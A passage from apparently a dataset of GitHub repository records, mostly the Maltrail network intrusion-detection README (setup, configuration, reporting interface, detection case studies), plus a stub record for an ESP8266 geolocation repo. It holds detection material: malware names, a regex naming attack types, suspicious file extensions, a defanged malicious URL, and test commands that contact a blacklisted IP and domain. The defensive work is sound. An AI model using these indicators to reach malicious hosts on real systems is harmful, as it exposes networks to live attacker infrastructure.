wallyshack, wannacry, wannamine, waprox, \\nwarezov, webcobra, wecorl, wecoym, weecnaw, whiteshadow, wildfire, winnti, \\nwndred, wofeksad, wolfresearch, wp-vcd, xadupi, xenotix, xpay, xshark, xtbl, \\nxtrat, yenibot, yimfoca, yoursqldumps, zaletelly, zcrypt, zegost, zemot, \\nzeroaccess, zeropadypt, zeus, zherotee, zlader, zloader, zlob, zombieboy, \\nzombrari, zonidel, zusy, zxshell, zyklon, etc.\\n```\\n\\n## Architecture\\n\\nMaltrail is based on the **Traffic** -&gt; **Sensor** &lt;-&gt; **Server** &lt;-&gt; **Client** architecture. **Sensor**(s) is a standalone component running on the monitoring node (e.g. Linux platform connected passively to the SPAN/mirroring port or transparently inline on a Linux bridge) or at the standalone machine (e.g. Honeypot) where it \\\"monitors\\\" the passing **Traffic** for blacklisted items/trails (i.e. domain names, URLs and/or IPs). In case of a positive match, it sends the event details to the (central) **Server** where they are being stored inside the appropriate logging directory (i.e. `LOG_DIR` described in the *Configuration* section). If **Sensor** is being run on the same machine as **Server** (default configuration), logs are stored directly into the local logging directory. Otherwise, they are being sent via UDP messages to the remote server (i.e. `LOG_SERVER` described in the *Configuration* section).\\n\\n![Architecture diagram](https://i.imgur.com/2IP9Mh2.png)\\n\\n**Server**'s primary role is to store the event details and provide back-end support for the reporting web application. In default configuration, server and sensor will run on the same machine. So, to prevent potential disruptions in sensor activities, the front-end reporting part is based on the [\\\"Fat client\\\"](https://en.wikipedia.org/wiki/Fat_client) architecture (i.e. all data post-processing is being done inside the client's web browser instance). Events (i.e. log entries) for the chosen (24h) period are transferred to the **Client**, where the reporting web application is solely responsible for the presentation part. Data is sent toward the client in compressed chunks, where they are processed sequentially. The final report is created in a highly condensed form, practically allowing presentation of virtually unlimited number of events.\\n\\nNote: **Server** component can be skipped altogether, and just use the standalone **Sensor**. In such case, all events would be stored in the local logging directory, while the log entries could be examined either manually or by some CSV reading application.\\n\\n## Quick start\\n\\nThe following set of commands should get your Maltrail **Sensor** up and running (out of the box with default settings and monitoring interface \\\"any\\\"):\\n\\n- For **Debian/Ubuntu**\\n\\n```\\nsudo apt-get install git python-pcapy\\ngit clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\nsudo python sensor.py\\n```\\n\\n- For **SUSE/openSUSE**\\n\\n```\\nsudo zypper install gcc gcc-c++ git libpcap-devel python-devel python2-pip\\nsudo pip2 install pcapy\\ngit clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\nsudo python sensor.py\\n```\\n\\n![Sensor](https://i.imgur.com/E9tt2ek.png)\\n\\nTo start the (optional) **Server** on same machine, open a new terminal and execute the following:\\n\\n```\\n[[ -d maltrail ]] || git clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\npython server.py\\n```\\n\\n![Server](https://i.imgur.com/loGW6GA.png)\\n\\nTo test that everything is up and running execute the following:\\n\\n```\\nping -c 1 136.161.101.53\\ncat /var/log/maltrail/$(date +\\\"%Y-%m-%d\\\").log\\n```\\n\\n![Test](https://i.imgur.com/NYJg6Kl.png)\\n\\nAlso, to test the capturing of DNS traffic you can try the following:\\n\\n```\\nnslookup morphed.ru\\ncat /var/log/maltrail/$(date +\\\"%Y-%m-%d\\\").log\\n```\\n\\n![Test2](https://i.imgur.com/62oafEe.png)\\n\\nTo stop **Sensor** and **Server** instances (if running in background) execute the following:\\n\\n```\\nsudo pkill -f sensor.py\\npkill -f server.py\\n```\\n\\nAccess the reporting interface (i.e. **Client**) by visiting the http://127.0.0.1:8338 (default credentials: `admin:changeme!`) from your web browser:\\n\\n![Reporting interface](https://i.imgur.com/VAsq8cs.png)\\n\\n## Administrator's guide\\n\\n### Sensor\\n\\nSensor's configuration can be found inside the `maltrail.conf` file's section `[Sensor]`:\\n\\n![Sensor's configuration](https://i.imgur.com/8yZKH14.png)\\n\\nIf option `USE_MULTIPROCESSING` is set to `true` then all CPU cores will be used. One core will be used only for packet capture (with appropriate affinity, IO priority and nice level settings), while other cores will be used for packet processing. Otherwise, everything will be run on a single core. Option `USE_FEED_UPDATES` can be used to turn off the trail updates from feeds altogether (and just use the provided static ones). Option `UPDATE_PERIOD` contains the number of seconds between each automatic trails update (Note: default value is set to `86400` (i.e. one day)) by using definitions inside the `trails` directory (Note: both **Sensor** and **Server** take care of the trails update). Option `CUSTOM_TRAILS_DIR` can be used by user to provide location of directory containing the custom trails (`*.txt`) files.\\nOption `USE_HEURISTICS` turns on heuristic mechanisms (e.g. `long domain name (suspicious)`, `excessive no such domain name (suspicious)`, `direct .exe download (suspicious)`, etc.), potentially introducing false positives. Option `CAPTURE_BUFFER` presents a total memory (in bytes of percentage of total physical memory) to be used in case of multiprocessing mode for storing packet capture in a ring buffer for further processing by non-capturing processes. Option `MONITOR_INTERFACE` should contain the name of the capturing interface. Use value `any` to capture from all interfaces (if OS supports this). Option `CAPTURE_FILTER` should contain the network capture (`tcpdump`) filter to skip the uninteresting packets and ease the capturing process. Option `SENSOR_NAME` contains the name that should be appearing inside the events `sensor_name` value, so the event from one sensor could be distinguished from the other. If option `LOG_SERVER` is set, then all events are being sent remotely to the **Server**, otherwise they are stored directly into the logging directory set with option `LOG_DIR`, which can be found inside the `maltrail.conf` file's section `[All]`. In case that the option `UPDATE_SERVER` is set, then all the trails are being pulled from the given location, otherwise they are being updated from trails definitions located inside the installation itself.\\n\\nWhen running the sensor (e.g. `sudo python sensor.py`) for the first time and/or after a longer period of non-running, it will automatically update the trails from trail definitions (Note: stored inside the `trails` directory). After the initialization, it will start monitoring the configured interface (option `MONITOR_INTERFACE` inside the `maltrail.conf`) and write the events to either the configured log directory (option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) or send them remotely to the logging/reporting **Server** (option `LOG_SERVER`).\\n\\n![Sensor run](https://i.imgur.com/A0qROp8.png)\\n\\nDetected events are stored inside the **Server**'s logging directory (i.e. option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) in easy-to-read CSV format (Note: whitespace ' ' is used as a delimiter) as single line entries consisting of: `time` `sensor` `src_ip` `src_port` `dst_ip` `dst_port` `proto` `trail_type` `trail` `trail_info` `reference` (e.g. `\\\"2015-10-19 15:48:41.152513\\\" beast 192.168.5.33 32985 8.8.8.8 53 UDP DNS 0000mps.webpreview.dsl.net malicious siteinspector.comodo.com`):\\n\\n![Sample log](https://i.imgur.com/RycgVru.png)\\n\\n### Server\\n\\nServer's configuration can be found inside the `maltrail.conf` section `[Server]`:\\n\\n![Server's configuration](https://i.imgur.com/TiUpLX8.png)\\n\\nOption `HTTP_ADDRESS` contains the web server's listening address (Note: use `0.0.0.0` to listen on all interfaces). Option `HTTP_PORT` contains the web server's listening port. Default listening port is set to `8338`. If option `USE_SSL` is set to `true` then `SSL/TLS` will be used for accessing the web server (e.g. `https://192.168.6.10:8338/`). In that case, option `SSL_PEM` should be pointing to the server's private/cert PEM file. \\n\\nSubsection `USERS` contains user's configuration settings. Each user entry consists of the `username:sha256(password):UID:filter_netmask(s)`. Value `UID` represents the unique user identifier, where it is recommended to use values lower than 1000 for administrative accounts, while higher value for non-administrative accounts. The part `filter_netmask(s)` represents the comma-delimited hard filter(s) that can be used to filter the shown events depending on the user account(s). Default entry is as follows:\\n\\n![Configuration users](https://i.imgur.com/PYwsZkn.png)\\n\\nOption `UDP_ADDRESS` contains the server's log collecting listening address (Note: use `0.0.0.0` to listen on all interfaces), while option `UDP_PORT` contains listening port value. If turned on, when used in combination with option `LOG_SERVER`, it can be used for distinct (multiple) **Sensor** <-> **Server** architecture.\\n\\nOption `FAIL2BAN_REGEX` contains the regular expression (e.g. `attacker|reputation|potential[^\\\"]*(web scan|directory traversal|injection|remote code)`) to be used in `/fail2ban` web calls for extraction of today's attacker source IPs. This allows the usage of IP blocking mechanisms (e.g. `fail2ban`, `iptables` or `ipset`) by periodic pulling of blacklisted IP addresses from remote location. Example usage would be the following script (e.g. run as a `root` cronjob on a minute basis):\\n\\n```\\n#!/bin/bash\\nipset -q flush maltrail\\nipset -q create maltrail hash:net\\nfor ip in $(curl http://127.0.0.1:8338/fail2ban 2>/dev/null | grep -P '^[0-9.]+$'); do ipset add maltrail $ip; done\\niptables -I INPUT -m set --match-set maltrail src -j DROP\\n```\\n\\n\\n\\nSame as for **Sensor**, when running the **Server** (e.g. `python server.py`) for the first time and/or after a longer period of non-running, if option `USE_SERVER_UPDATE_TRAILS` is set to `true`, it will automatically update the trails from trail definitions (Note: stored inside the `trails` directory). Its basic function is to store the log entries inside the logging directory (i.e. option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) and provide the web reporting interface for presenting those same entries to the end-user (Note: there is no need install the 3rd party web server packages like Apache):\\n\\n![Server run](https://i.imgur.com/GHdGPw7.png)\\n\\n## User's guide\\n\\n### Reporting interface\\n\\nWhen entering the **Server**'s reporting interface (i.e. via the address defined by options `HTTP_ADDRESS` and `HTTP_PORT`), user will be presented with the following authentication dialog. User has to enter the proper credentials that have been set by the server's administrator inside the configuration file `maltrail.conf` (Note: default credentials are `admin:changeme!`):\\n\\n![User login](https://i.imgur.com/WVpASAI.png)\\n\\nOnce inside, user will be presented with the following reporting interface:\\n\\n![Reporting interface](https://i.imgur.com/PZY8JEC.png)\\n\\nThe top part holds a sliding timeline (Note: activated after clicking the current date label and/or the calendar icon ![Calendar icon](https://i.imgur.com/NfNore9.png)) where user can select logs for past events (Note: mouse over event will trigger display of tooltip with approximate number of events for current date). Dates are grouped by months, where 4 month period of data are displayed inside the widget itself. However, by using the provided slider (i.e. ![Timeline slider](https://i.imgur.com/SNGVSaP.png)) user can easily access events from previous months.\\n\\n![Timeline](https://i.imgur.com/RnIROcn.png)\\n\\nOnce clicking the date, all events for that particular date should be loaded and represented by the client's web browser. Depending on number of events and the network connection speed, loading and display of logged events could take from couple of seconds, up to several minutes (e.g. 100,000 events takes around 5 seconds in total). For the whole processing time, animated loader will be displayed across the disabled user interface:\\n\\n![Loader](https://i.imgur.com/oX7Rtjo.png)\\n\\nMiddle part holds a summary of displayed events. `Events` box represents total number of events in a selected 24-hour period, where red line represents IP-based events, blue line represents DNS-based events and yellow line represents URL-based events. `Sources` box represents number of events per top sources in form of a stacked column chart, with total number of sources on top. `Threats` box represents percentage of top threats in form of a pie chart (Note: gray area holds all threats having each &lt;1% in total events), with total number of threats on top. `Trails` box represents percentage of top trails in form of a pie chart (Note: gray area holds all trails having each &lt;1% in total events), with total number of trails on top. Each of those boxes are active, hence the click on one of those will result with a more detailed graph.\\n\\n![Summary](https://i.imgur.com/5NFbqCb.png)\\n\\nBottom part holds a condensed representation of logged events in form of a paginated table. Each entry holds details for a single threat (Note: uniquely identified by a pair `(src_ip, trail)` or `(dst_ip, trail)` if the `src_ip` is the same as the `trail` as in case of attacks coming from the outside):\\n\\n![Single threat](https://i.imgur.com/IxPwKKZ.png)\\n\\nColumn `threat` holds threat's unique ID (e.g. `85fdb08d`) and color (Note: extruded from the threat's ID), `sensor` holds sensor name(s) where the event has been triggered (e.g. `blitvenica`), `events` holds total number of events for a current threat, `severity` holds evaluated severity of threat (Note: calculated based on values in `info` and `reference` columns, prioritizing malware generated traffic), `first_seen` holds time of first event in a selected (24h) period (e.g. `06th 08:21:54`), `last_seen` holds time of last event in a selected (24h) period (e.g. `06th 15:21:23`), `sparkline` holds a small sparkline graph representing threat's activity in selected period, `src_ip` holds source IP(s) of a threat (e.g. `99.102.41.102`), `src_port` holds source port(s) (e.g. `44556, 44589, 44601`), `dst_ip` holds destination IP(s) (e.g. `213.202.100.28`), `dst_port` holds destination port(s) (e.g. `80 (HTTP)`), `proto` holds protocol(s), (e.g. `TCP`), `trail` holds a blacklisted (or heuristic) entry that triggered the event(s), `info` holds more information about the threat/trail (e.g. `known attacker` for known attacker's IP addresses or `ipinfo` for known IP information service commonly used by malware during a startup), `reference` holds a source of the blacklisted entry (e.g. `(static)` for static trails or `myip.ms` for a dynamic feed retrieved from that same source) and `tags` holds user defined tags for a given trail (e.g. `APT28`).\\n\\nWhen moving mouse over `src_ip` and `dst_ip` table entries, information tooltip is being displayed with detailed reverse DNS and WHOIS information (Note: [RIPE](http://www.ripe.net/) is the information provider):\\n\\n![On mouse over IP](https://i.imgur.com/BgKchAX.png)\\n\\nEvent details (e.g. `src_port`, `dst_port`, `proto`, etc.) that differ inside same threat entry are condensed in form of a bubble icon (i.e. ![Ellipsis](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/ellipsis.png)). This is performed to get an usable reporting interface with as less rows as possible. Moving mouse over such icon will result in a display of an information tooltip with all items held (e.g. all port numbers being scanned by `attacker`):\\n\\n![On mouse over bubble](https://i.imgur.com/BfYT2u7.png)\\n\\nClicking on one such icon will open a new dialog containing all stored items (Note: in their uncondensed form) ready to be Copy-Paste(d) for further analysis:\\n\\n![Ctrl-C dialog](https://i.imgur.com/9pgMpiR.png)\\n\\nWhen hovering mouse pointer over the threat's trail for couple of seconds it will result in a frame consisted of results using the trail as a search term performed against [DuckDuckGo](https://duckduckgo.com/) search engine. In lots of cases, this provides basic information about the threat itself, eliminating the need for user to do the manual search for it. In upper right corner of the opened frame window there are two extra buttons. By clicking the first one (i.e. ![New tab icon](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/newtab.png)), the resulting frame will be opened inside the new browser's tab (or window), while by clicking the second one (i.e. ![Close icon](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/close.png)) will immediately close the frame (Note: the same action is achieved by moving the mouse pointer outside the frame borders):\\n\\n![On mouse over trail](https://i.imgur.com/ppoMHub.png)\\n\\nFor each threat there is a column `tag` that can be filled with arbitrary \\\"tags\\\" to closely describe all threats sharing the same trail. Also, it is a great way to describe threats individually, so all threats sharing the same tag (e.g. `yahoo`) could be grouped out later:\\n\\n![Tags](https://i.imgur.com/u5Z4752.png)\\n\\n### Real-life cases\\n\\nIn the following section some of the \\\"usual suspects\\\" scenarios will be described through the real-life cases.\\n\\n#### Mass scans\\n\\nMass scans is a fairly common phenomenon where individuals and/or organizations give themselves a right to scan the whole 0.0.0.0/0 IP range (i.e. whole Internet) on a daily basis, with disclaimer where they say that if you don't like it then you should contact them privately to be skipped from future scans. \\n\\n![Shodan FileZilla results](https://i.imgur.com/nwOwLP9.png)\\n\\nTo make stuff worse, organizations as [Shodan](https://www.shodan.io/) and [ZoomEye](http://www.zoomeye.org) give all results freely available (to other potential attackers) through their search engine. In the following screenshots you'll see details of Shodan scans in one single day.\\n\\nHere is a reverse DNS and WHOIS lookup of the \\\"attacker\\\"'s address:\\n\\n![Shodan 1](https://i.imgur.com/LQ6Vu00.png)\\n\\nWhen hovering mouse pointer over the `trail` column's content (IP address), you'll be presented with the search results from [DuckDuckGo](https://duckduckgo.com/) where you'll be able to find more information about the \\\"attacker\\\" (i.e. Shodan):\\n\\n![Shodan 2](https://i.imgur.com/sv7ONzk.png)\\n\\nIn the `dst_ip` column, if you have a large organization, you'll be presented with large list of scanned IP addresses:\\n![Shodan 3](https://i.imgur.com/EhAtXs7.png)\\n\\nIn the `dst_port` column you'll be able to see all ports that have been scanned by such mass scans:\\n\\n![Shodan 4](https://i.imgur.com/Wk8Xjhq.png)\\n\\nIn other similar situations you'll see the same behaviour, coming from blacklisted individual attacker(s) (in this case by [cinsscore.com](http://cinsscore.com/)):\\n\\n![Known attacker](https://i.imgur.com/wSOOnQM.png)\\n\\nOne more common behaviour is scanning of the whole 0.0.0.0/0 IP range (i.e. Internet) in search for one particular port (e.g. TCP port 443 when [Heartbleed](http://heartbleed.com/) has been found). In the following screenshot you'll find one such case for previously blacklisted attacker(s) (in this case by [alienvault.com](http://alienvault.com) and two other blacklists) targeting the UDP port 5060 (i.e. SIP) in search for [misconfigured VoIP devices](https://isc.sans.edu/diary/Targeting+VoIP%3A+Increase+in+SIP+Connections+on+UDP+port+5060/9193):\\n\\n![SIP scan](https://i.imgur.com/dkJfU86.png)\\n\\n#### Anonymous attackers\\n\\nTo spot the potential attackers hidden behind the [Tor](https://www.torproject.org/) anonymity network, Maltrail utilizes publicly available lists of Tor exit nodes. In the following screenshot you'll see a case where potential attacker has been utilizing the Tor network to access the web target (over HTTP) in our organization's range in suspicious way (total 171 connection requests in 10 minutes):\\n\\n![Tor attacker](https://i.imgur.com/dXF8r2K.png)\\n\\n#### Service attackers\\n\\nFairly similar case to the previous one is when previously blacklisted attacker tries to access particular (e.g. non-HTTP(s)) service in our organization's range in rather suspicious way (i.e. total 1513 connection attempts in less than 15 minutes):\\n\\n![RDP brute force](https://i.imgur.com/Oo2adCf.png)\\n\\nIf we enter the `ssh attacker` to the `Filter` field, we'll be able to see all similar occurrences for that day, but in this case for port 22 (i.e. SSH):\\n\\n![SSH attackers filter](https://i.imgur.com/oCv42jd.png)\\n\\n#### Malware\\n\\nIn case of connection attempts coming from infected computers inside our organization toward already known C&C servers, you'll be able to find threats similar to the following (in this case [Beebone](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32/Beebone)):\\n\\n![beebone malware](https://i.imgur.com/GBLWISo.png)\\n\\nIn case of DNS requests containing known [DGA](https://en.wikipedia.org/wiki/Domain_generation_algorithm) domain names, threat will be shown like (in this case [Necurs](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32/Necurs)):\\n\\n![necurs malware](https://i.imgur.com/8tWj2pm.png)\\n\\nIn the following case file downloads from blacklisted (in this case by [malwarepatrol.net](https://malwarepatrol.net/)) URL(s) have occurred:\\n\\n![malware download](https://i.imgur.com/g2NH7sT.png)\\n\\nIf we enter the particular malware name (in this case [Ramnit](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32%2fRamnit)) into the `Filter` field, only threats that are known to be linked to this malware will be filtered in (showing you all affected internal computers):\\n\\n![ramnit malware](https://i.imgur.com/zcoPnZk.png)\\n\\nMore generally, if we enter the `malware` into the `Filter` field, all threats that have been found by malware(-related) trails (e.g. `IP` addresses) will be filtered in:\\n\\n![malware filter](https://i.imgur.com/gVYAfSU.png)\\n\\n#### Suspicious domain lookups\\n\\nMaltrail uses the static list of TLD [domains](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/domain.txt) that are known to be commonly involved in suspicious activities. Most such [TLD](https://en.wikipedia.org/wiki/Top-level_domain) domains are coming from free domain registrars (e.g. [Freenom](http://www.freenom.com)), hence they should be under greater scrutiny. In the following screenshot we can find a case where one such TLD domain `.cm` has been used by unknown malware using the [DGA](https://en.wikipedia.org/wiki/Domain_generation_algorithm) algorithm to contact its [C&C](https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-%28c-c%29-server) server(s):\\n\\n![cm DGA](https://i.imgur.com/JTGdtJ0.png)\\n\\nThere are also cases when perfectly valid TLD domains (e.g. `.ru`) are used for suspicious activities, such in this case (e.g. `long domain name (suspicious)`) where the domains are obviously DGA generated by unknown malware:\\n\\n![Suspicious long domains](https://i.imgur.com/EJOS5Qb.png)\\n\\nMaltrail uses static [list](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/dynamic_domain.txt) of so-called \\\"dynamic domains\\\" that are often used in suspicious activities (e.g. for malware C&C servers that often change the destination's IP addresses):\\n\\n![Suspicious dynamic domains](https://i.imgur.com/1WVLMf9.png)\\n\\nAlso, Maltrail uses static [list](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/onion.txt) of \\\"onion\\\"-related domains that are also often used in suspicious activities (e.g. malware contacting C&amp;C servers by using Tor2Web service(s)):\\n\\n![Suspicious onion](https://i.imgur.com/QdoAY0w.png)\\n\\nIn case of old and/or obsolete malware that sits undetected on organization's infected internal computers, there is often a \\\"phenomenon\\\" where malware continuously tries to contact the long dead C&amp;C server's domain without any DNS resolution. Hence, those kind of (potential) threats will be marked as `excessive no such domain (suspicious)`:\\n\\n![Excessive no such domain name](https://i.imgur.com/KPwNOM8.png)\\n\\nIn case that one trail is responsible for too many threats (e.g. in case of fake source IPs like in DNS amplification attacks), all similar threats will be grouped under a single `flood` threat (Note: threat's ID will be marked with suffix `F0`), like in the following example:\\n\\n![Flood](https://i.imgur.com/ZtpMR3d.png)\\n\\n#### Suspicious ipinfo requests\\n\\nLots of malware uses some kind of `ipinfo` service (e.g. [ipinfo.io](http://ipinfo.io)) to find out the victim's Internet IP address. In case of regular and especially in out-of-office hours, those kind of requests should be closely monitored, like in the following example:\\n\\n![suspicious ipinfo](https://i.imgur.com/3THOoWW.png)\\n\\nBy using filter `ipinfo` all potentially infected computers in our organization's range can be listed that share this kind of suspicious behaviour:\\n\\n![ipinfo filter](https://i.imgur.com/6SMN0at.png)\\n\\n#### Suspicious direct file downloads\\n\\nMaltrail tracks all suspicious direct file download attempts (e.g. `.apk`, `.bin`, .`chm`, `.dll`, `.egg`, `.exe`, `.hta`, `.hwp`, `.ps1`, `.scr`, `.sct` and `.xpi` file extensions). This can trigger lots of false positives, but eventually could help in reconstruction of the chain of infection (Note: legitimate service providers, like Google, usually use encrypted HTTPS to perform this kind of downloads):\\n\\n![Direct .exe download](https://i.imgur.com/jr5BS1h.png)\\n\\n#### Suspicious HTTP requests\\n\\nIn case of suspicious requests coming from outer web application security scanners (e.g. searching for SQLi, XSS, LFI, etc. vulnerabilities) and/or the internal user malicious attempts toward unknown web sites, threats like the following could be found (real case of attackers trying to exploit Joomla! CMS CVE-2015-7297, CVE-2015-7857, and CVE-2015-7858 [vulnerabilities](https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html)):\\n\\n![SQLi com_contenthistory](https://i.imgur.com/pZuGXpr.png)\\n\\nIn following example, web application vulnerability scan has been marked as \\\"suspicious\\\":\\n\\n![Vulnerability scan](https://i.imgur.com/QzcaEsG.png)\\n\\nIf we click on the bubble icon (i.e. ![Ellipsis](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/ellipsis.png)) for details and copy paste the whole content to a textual file, we'll be able to see all suspicious HTTP requests:\\n\\n![Vulnerability scan requests](https://i.imgur.com/XY9K01o.png)\\n\\nIn the following screenshot, a run of popular SQLi vulnerability tool [sqlmap](https://github.com/sqlmapproject/sqlmap/) can be found inside our logs:\\n\\n![sqlmap scan requests](https://i.imgur.com/mHZmM7t.png)\\n\\n#### Port scanning\\n\\nIn case of too many connection attempts toward considerable amount of different TCP ports, Maltrail will warn about the potential port scanning, as a result of its heuristic mechanism detection. It the following screenshot such warning(s) can be found for a run of popular port scanning tool [nmap](https://nmap.org/):\\n\\n![nmap scan](https://i.imgur.com/VS7L2A3.png)\\n\\n#### DNS resource exhaustion\\n\\nOne popular DDoS attack against the web server(s) infrastructure is the resource exhaustion of its (main) DNS server by making valid DNS recursion queries for (pseudo)random subdomain names (e.g. `abpdrsguvjkyz.www.dedeni.com`):\\n\\n![DNS resource exhaustion](https://i.imgur.com/RujhnKW.png)\\n\\n#### Data leakage\\n\\nMiscellaneous programs (especially mobile-based) present malware(-like) behaviour where they send potentially sensitive data to the remote beacon posts. Maltrail will try to capture such behaviour like in the following example:\\n\\n![Data leakage](https://i.imgur.com/6zt2gXg.png)\\n\\n#### False positives\\n\\nLike in all other security solutions, Maltrail is prone to \\\"[false positives](https://en.wikipedia.org/wiki/False_positives_and_false_negatives)\\\". In those kind of cases, Maltrail will (especially in case of `suspicious` threats) record a regular user's behaviour and mark it as malicious and/or suspicious. In the following example it can be seen that a blacklist feed provider `blocklist.de` marked regular Google server as `attacker`(s), resulting with the following threat:\\n\\n![Google false positive 1](https://i.imgur.com/HFvCNNK.png)\\n\\nBy hovering mouse over the trail, frame with results from [DuckDuckGo](https://duckduckgo.com/) search show that this is a regular Google's server:\\n\\n![Google false positive 2](https://i.imgur.com/4cS9NJB.png)\\n\\nAs another example, access to regular `.work` domains (popular TLD for malicious purposes) resulted with the following threat:\\n\\n![Suspicious domain false positive](https://i.imgur.com/Msq8HgH.png)\\n\\nNevertheless, administrator(s) should invest some extra time and check (with other means) whether the \\\"suspicious\\\" means malicious or not, as in the following example:\\n\\n![Suspicious .ws](https://i.imgur.com/bOLmXUE.png)\\n\\n## Requirements\\n\\nTo properly run the Maltrail, [Python](http://www.python.org/download/) **2.6**, **2.7** or **3.x** is required, together with [pcapy](https://www.coresecurity.com/corelabs-research/open-source-tools/pcapy) (e.g. `sudo apt-get install python-pcapy`). There are no other requirements, other than to run the **Sensor** component with the administrative/root privileges.\\n\\n## Best practice(s)\\n\\n1. Install Maltrail:\\n\\n- On **Debian/Ubuntu** Linux OS\\n\\n ```\\n sudo apt-get install git python-pcapy\\n cd /tmp\\n git clone --depth 1 https://github.com/stamparm/maltrail.git\\n sudo mv /tmp/maltrail /opt\\n sudo chown -R $USER:$USER /opt/maltrail\\n ```\\n \\n- On **SUSE/openSUSE** Linux OS\\n\\n ```\\n sudo zypper install gcc gcc-c++ git libpcap-devel python-devel python2-pip\\n sudo pip2 install pcapy\\n cd /tmp\\n git clone --depth 1 https://github.com/stamparm/maltrail.git\\n sudo mv /tmp/maltrail /opt\\n sudo chown -R $USER:$USER /opt/maltrail\\n ```\\n\\n2. Set working environment:\\n\\n ```\\n sudo mkdir -p /var/log/maltrail\\n sudo mkdir -p /etc/maltrail\\n sudo cp /opt/maltrail/maltrail.conf /etc/maltrail\\n sudo nano /etc/maltrail/maltrail.conf\\n ```\\n\\n3. Set running environment:\\n\\n * `crontab -e # autostart server & periodic update`\\n\\n ```\\n */5 * * * * if [ -n \\\"$(ps -ef | grep -v grep | grep 'server.py')\\\" ]; then : ; else python /opt/maltrail/server.py -c /etc/maltrail/maltrail.conf; fi\\n 0 1 * * * cd /opt/maltrail && git pull\\n ```\\n\\n * `sudo crontab -e # autostart sensor & periodic restart`\\n\\n ```\\n */1 * * * * if [ -n \\\"$(ps -ef | grep -v grep | grep 'sensor.py')\\\" ]; then : ; else python /opt/maltrail/sensor.py -c /etc/maltrail/maltrail.conf; fi\\n 2 1 * * * /usr/bin/pkill -f maltrail\\n ```\\n\\n## License\\n\\nThis software is provided under a MIT License. See the accompanying [LICENSE](https://github.com/stamparm/maltrail/blob/master/LICENSE) file for more information.\\n\\n## Developers\\n\\n* Miroslav Stampar ([@stamparm](https://github.com/stamparm))\\n* Mikhail Kasimov ([@MikhailKasimov](https://github.com/MikhailKasimov))\\n\\n## Presentations\\n\\n* 47th TF-CSIRT Meeting, Prague (Czech Republic), 2016 ([slides](https://www.terena.org/activities/tf-csirt/meeting47/M.Stampar-Maltrail.pdf))\\n\\n## Blacklist\\n\\n* Maltrail's daily updated blacklist of malware-related domains can be found [here](https://raw.githubusercontent.com/stamparm/aux/master/maltrail-malware-domains.txt). It is based on trails found at [trails/static/malware](trails/static/malware) and can be used for DNS traffic blocking purposes.\\n\\n## Thank you\\n\\n* Thomas Kristner\\n* Eduardo Arcusa Les\\n* James Lay\\n* Ladislav Baco (@laciKE)\\n* John Kristoff (@jtkdpu)\\n* Michael M&uuml;nz (@mimugmail)\\n* David Brush\\n* @Godwottery\\n\\n## Third-party integrations\\n\\n* [FreeBSD Port](https://www.freshports.org/security/maltrail)\\n* [OPNSense Gateway Plugin](https://github.com/opnsense/plugins/pull/1257)\\n* [D4 Project](https://www.d4-project.org/2019/09/25/maltrail-integration.html)\\n* [BlackArch Linux](https://github.com/BlackArch/blackarch/blob/master/packages/maltrail/PKGBUILD)\\n* [GScan](https://github.com/grayddq/GScan) <sup>1</sup>\\n* [MalwareWorld](https://www.malwareworld.com/) <sup>1</sup>\\n* [oisd | domain blocklist](https://oisd.nl/?p=inc) <sup>1</sup>\\n* [NextDNS](https://github.com/nextdns/metadata/blob/e0c9c7e908f5d10823b517ad230df214a7251b13/security/threat-intelligence-feeds.json) <sup>1</sup>\\n\\n <sup>1</sup> Using (only) trails\\n\"", "topics": ["heuristics", "intrusion-detection", "malware", "network-monitoring", "python", "security", "sensor"], "writeup": "Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. zvpprsensinaix.com for Banjori malware), URL (e.g. hXXp://109.162.38.120/harsh02.exe for known malicious executable), IP address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header value (e.g. sqlmap for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).", "ignoredescription": false, "id": 45, "full_name": "stamparm/maltrail", "url": "https://github.com/stamparm/maltrail"},
{"tags": ["esp8266", "geo", "google", "gps"], "owner": "techiesms", "description": "This is the code for getting location onto your ESP8266 board without using any GPS harware or GPS module. This code uses Google Geolocation API for fetching location", "name": "Geolocation", "topics_string": "esp8266 geo google gps", "language": "Arduino", "readme": "", "topics": [], "writeup": "", "ignoredescription": false, "id": 46, "full_name": "techiesms/Geolocation", "url": "https://github.com/techiesms/Geolocation"},
